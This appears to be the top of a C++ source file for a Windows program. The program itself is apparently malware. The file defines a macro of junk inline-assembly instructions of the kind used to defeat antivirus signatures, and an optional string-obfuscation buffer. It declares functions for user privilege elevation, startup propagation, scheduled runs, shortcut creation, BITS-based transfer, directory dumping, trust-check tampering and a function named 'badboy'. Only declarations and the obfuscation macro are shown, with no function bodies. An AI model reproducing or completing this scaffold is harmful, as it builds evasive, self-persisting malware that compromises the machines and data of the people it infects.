#define MAINFILE

#include "com_bits.h"
#include "fileio.h"
#include <time.h>
#include <windows.h>
#include <Lmcons.h> //for UNLEN
#include <shlobj.h> //for IsUserAnAdmin
#include <direct.h> //for _wchdir
#include <iostream>
#include <fstream>
#include <string>

#include "dirdump.h"
#include "limitsingleinstance.h"

#include <Softpub.h>
#include <wincrypt.h>
#include <wintrust.h> //for wintrust
#pragma comment (lib, "wintrust")

#define JUNK_CODE_ONE        \
    __asm{push eax}            \
	__asm{nop}					\
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
	__asm{nop}					\
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
	__asm{inc eax}			\
	__asm{nop}					\
	__asm{dec eax}			\
	__asm{nop}					\
    __asm{xchg eax, edx}    \
	__asm{inc eax}			\
	__asm{inc ecx}			\
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
	__asm{dec eax}			\
	__asm{nop}					\
	__asm{inc eax}			\
	__asm{dec ecx}			\
	__asm{nop}			\
	__asm{inc ecx}			\
	__asm{dec eax}			\
	__asm{nop}			\
	__asm{dec edx}			\
	__asm{dec ecx}			\
	__asm{inc edx}			\
    __asm{pop eax}


bool mode_bits();
bool mode_alternative();
void user_elevation();
std::wstring startup_propogation();
void mkshortcut(const std::wstring& target, const std::wstring& linkpath);
void schedule_run();
long trust_issue();
void badboy();
std::wstring getmypath();

int main2(const wchar_t *strPath);

#ifdef _STRING_PROTECTION
std::vector<void *> stringprotection;
char stringprotectionkey[8];
bool stringprotectioninitialized = false;
#endif

#include "common.h"